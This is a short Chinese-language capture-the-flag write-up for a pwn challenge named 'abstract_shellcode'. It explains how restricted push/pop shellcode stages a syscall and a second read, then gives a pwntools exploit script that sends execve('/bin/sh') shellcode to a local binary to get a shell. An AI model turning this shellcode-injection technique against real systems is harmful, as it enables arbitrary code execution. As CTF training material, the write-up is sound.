## abstract_shellcode


***

出题人：kadelin

![image-20240413224417937](C:\Users\26272\AppData\Roaming\Typora\typora-user-images\image-20240413224417937.png)

解题思路：利用前面判断no的输入往栈写入syscall的字节码，接着后面使用pop code将栈中的syscall填充到shellcode底部，接着再控制rax rdi rsi rdx再进行一次read往栈写入shellcode即可getshell

构造exp

```python
from pwn import *
context(os='linux', arch='amd64', log_level='debug')


io = process('./ezshellcode')


io.recv()
io.send(b'\x0f\x05') # syscall


shellcode = """
push rdi
pop rax
push rbx
pop rdx
push rax
push rax
push rbp
pop rsp
pop rdx
pop rdx
pop rdx
push rdx
push rdx
push rdx
push rdx
push rdx
"""

payload = asm(shellcode) + b"\x5f"

#16

io.send(payload)

shellcode = shellcraft.execve("/bin/sh", 0, 0)


io.send(b"aa" + asm(shellcode))


io.interactive()

#ubuntu20.04

```



